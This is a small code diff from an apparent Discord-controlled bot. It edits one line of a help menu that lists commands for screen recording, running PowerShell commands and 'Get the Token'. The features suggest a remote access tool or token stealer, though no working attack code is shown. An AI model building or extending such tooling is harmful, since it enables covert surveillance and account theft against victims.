@@ -421,7 +421,7 @@ async def commands(ctx):
     embed.add_field(name="▶️ .sr", value="Start screen recording", inline=False)
     embed.add_field(name="💌 .powershell [command]", value="command powershell.", inline=False)
     embed.add_field(name="📂 .directory", value="shows where its directory is.", inline=False)
-    embed.add_field(name="🔥 .token, value", value="Get the Token🤑", inline=False)
+    embed.add_field(name="🔥 .token", value="Get the Token🤑.", inline=False)
     await ctx.send(embed=embed)
 
 @bot.command()
